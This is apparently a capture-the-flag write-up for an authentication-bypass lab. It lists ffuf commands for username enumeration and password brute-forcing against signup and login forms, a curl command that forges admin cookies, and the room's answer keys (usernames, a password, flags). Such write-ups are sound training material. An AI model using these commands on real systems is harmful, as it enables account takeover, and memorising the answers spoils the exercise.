# Authentication Bypass

## Task 1 - Brief
No answer needed, deploy the machine

## Task 2 - Username Enumeration

In order to get the answers for the second task, the following command has to be executed:

ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http:// IP deployed machine/customers/signup -mr "username already exists" > valid_usernames.txt

At the end of the command we are creating a file called "valid_usernames.txt" with the results of the command executed.
<br/>


Answers:  
<br/>


What is the username starting with si*** ?  

R/ simon


What is the username starting with st*** ?  

R/ steve


What is the username starting with ro**** ?  

R/ robert

## Task 3 - Brute Force

The following command must be use in order to get the answer.

ffuf -w usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http:// IP deployed machine/customers/login -fc 200

Note: I had to create a new file that I named "usernames.txt" with the same information that I found in Task 2 due to the issue mentioned in task 3.

Answer:
<br/>

What is the valid username and password (format: username/password)?

R/ steve/thunder

## Task 4 - Logical Flaw

Answer:
<br/>

What is the flag from Robert's support ticket?

R/ THM{AUTH_BYPASS_COMPLETE}

## Task 5 - Cookie Tampering



What is the flag from changing the plain text cookie values?

To get the answer the cookie admin needs to be set to "true". curl - H "Cookie: logged_in=true; admin=true" http:// IP deployed machine/cookie-text

R/ THM{COOKIE_TAMPERING}

<br/>



What is the value of the md5 hash 3b2a1053e3270077456a79192070aa78 ?

Go to the site https://crackstation.net/ enter as input the hash value and then click on Crack Hashes button and you will get the response.

R/ 463729

<br/>



What is the base64 decoded value of VEhNe0JBU0U2NF9FTkNPRElOR30= ?

Go to the site https://gchq.github.io/CyberChef/ select "From Base64" and add it to recipe. Once it has been added to recipe copy the base64 encode value and paste it on "Input" section and you will get the response.

R/ THM{BASE64_ENCODING}

<br/>



Encode the following value using base64 {"id":1,"admin":true}

Go to the site https://gchq.github.io/CyberChef/ select "To Base64" and add it to recipe. Once it has been added to recipe copy the string value value and paste it on "Input" section and you will get the response.

R/ eyJpZCI6MSwiYWRtaW4iOnRydWV9
